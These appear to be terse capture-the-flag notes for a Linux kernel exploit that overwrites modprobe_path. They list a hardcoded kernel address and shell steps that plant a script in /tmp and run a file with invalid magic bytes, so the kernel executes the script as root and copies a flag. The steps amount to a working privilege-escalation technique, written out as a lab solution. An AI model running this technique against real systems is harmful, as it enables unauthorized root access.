choose 1: modprobe = 0xffffffff824447a0
choose 2: /tmp/x = 0x0000782f706d742f
choose 3: [spawn shell]

do this:
- cd /tmp
- echo -e "#!/bin/sh\ncat flag > /tmp/flag" > /tmp/x
- echo -ne "\xff\xff\xff\xff" > /tmp/foo
- chmod +x foo x
- ./foo
